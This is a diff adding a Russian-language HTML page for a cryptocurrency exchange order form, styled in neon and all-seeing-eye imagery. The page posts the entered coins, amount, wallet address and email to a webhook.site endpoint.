@@ -1,0 +1,168 @@
+﻿<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8">
+  <title>🔺 Кибер Обменник</title>
+  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@600&display=swap" rel="stylesheet">
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Orbitron', sans-serif;
+      background: linear-gradient(to bottom, #0d0d0d, #1a1a1a);
+      color: #00ffcc;
+      background-image: url('https://upload.wikimedia.org/wikipedia/commons/thumb/6/6b/All_Seeing_Eye.svg/2048px-All_Seeing_Eye.svg.png');
+      background-size: 25%;
+      background-repeat: no-repeat;
+      background-position: center top;
+      animation: pulseBackground 15s infinite ease-in-out;
+    }
+
+    @keyframes pulseBackground {
+      0%, 100% { opacity: 0.05; }
+      50% { opacity: 0.2; }
+    }
+
+    .container {
+      max-width: 500px;
+      margin: 100px auto;
+      background: rgba(0, 0, 0, 0.8);
+      border: 2px solid #00ffcc;
+      padding: 30px;
+      border-radius: 20px;
+      box-shadow: 0 0 20px #00ffcc;
+    }
+
+    h1 {
+      text-align: center;
+      font-size: 2rem;
+      color: #00ffcc;
+      margin-bottom: 30px;
+    }
+
+    label {
+      display: block;
+      margin-top: 10px;
+      color: #99ffee;
+    }
+
+    input, select {
+      width: 100%;
+      padding: 12px;
+      margin-top: 5px;
+      background: #111;
+      color: #00ffcc;
+      border: 1px solid #00ffcc;
+      border-radius: 10px;
+      font-size: 1rem;
+    }
+
+    button {
+      margin-top: 20px;
+      width: 100%;
+      padding: 15px;
+      background: linear-gradient(to right, #00ffcc, #0033cc);
+      color: black;
+      font-weight: bold;
+      border: none;
+      border-radius: 15px;
+      font-size: 1rem;
+      cursor: pointer;
+      transition: 0.3s ease;
+      box-shadow: 0 0 10px #00ffcc;
+    }
+
+    button:hover {
+      background: linear-gradient(to right, #ff00cc, #3300cc);
+      color: white;
+    }
+
+    #status {
+      margin-top: 15px;
+      text-align: center;
+      font-size: 1rem;
+      color: #00ffaa;
+    }
+
+    .symbol {
+      position: absolute;
+      top: 20px;
+      left: 20px;
+      width: 80px;
+      opacity: 0.1;
+    }
+  </style>
+</head>
+<body>
+
+  <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/32/All-seeing-eye.svg/2048px-All-seeing-eye.svg.png" class="symbol" alt="Symbol">
+
+  <div class="container">
+    <h1>🔺 КИБЕР ОБМЕННИК</h1>
+
+    <label for="from">Из валюты:</label>
+    <select id="from">
+      <option value="BTC">BTC – Bitcoin</option>
+      <option value="ETH">ETH – Ethereum</option>
+      <option value="USDT">USDT – Tether</option>
+      <option value="BNB">BNB – Binance Coin</option>
+      <option value="SOL">SOL – Solana</option>
+      <option value="XRP">XRP – Ripple</option>
+      <option value="ADA">ADA – Cardano</option>
+      <option value="DOGE">DOGE – Dogecoin</option>
+    </select>
+
+    <label for="to">В валюту:</label>
+    <select id="to">
+      <option value="USDT">USDT – Tether</option>
+      <option value="BTC">BTC – Bitcoin</option>
+      <option value="ETH">ETH – Ethereum</option>
+      <option value="BNB">BNB – Binance Coin</option>
+      <option value="SOL">SOL – Solana</option>
+      <option value="XMR">XMR – Monero</option>
+    </select>
+
+    <label for="amount">Сумма:</label>
+    <input type="number" id="amount" placeholder="Введите сумму">
+
+    <label for="wallet">Кошелёк:</label>
+    <input type="text" id="wallet" placeholder="Адрес кошелька">
+
+    <label for="email">Email:</label>
+    <input type="email" id="email" placeholder="example@domain.com">
+
+    <button onclick="sendOrder()">🚀 ОТПРАВИТЬ ЗАЯВКУ</button>
+
+    <div id="status"></div>
+  </div>
+
+  <script>
+    function sendOrder() {
+      const data = {
+        from: document.getElementById('from').value,
+        to: document.getElementById('to').value,
+        amount: document.getElementById('amount').value,
+        wallet: document.getElementById('wallet').value,
+        email: document.getElementById('email').value,
+        timestamp: new Date().toISOString()
+      };
+
+      fetch('https://webhook.site/b2ac3a60-6005-40c1-bc22-4c2b4efdd6bb', { // 🟢 ЗАМЕНИ НА СВОЙ
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify(data)
+      })
+      .then(res => {
+        if (res.ok) {
+          document.getElementById('status').innerText = '✅ Заявка успешно отправлена!';
+        } else {
+          document.getElementById('status').innerText = '❌ Ошибка при отправке.';
+        }
+      })
+      .catch(() => {
+        document.getElementById('status').innerText = '⚠️ Нет соединения.';
+      });
+    }
+  </script>
+</body>
+</html>
+
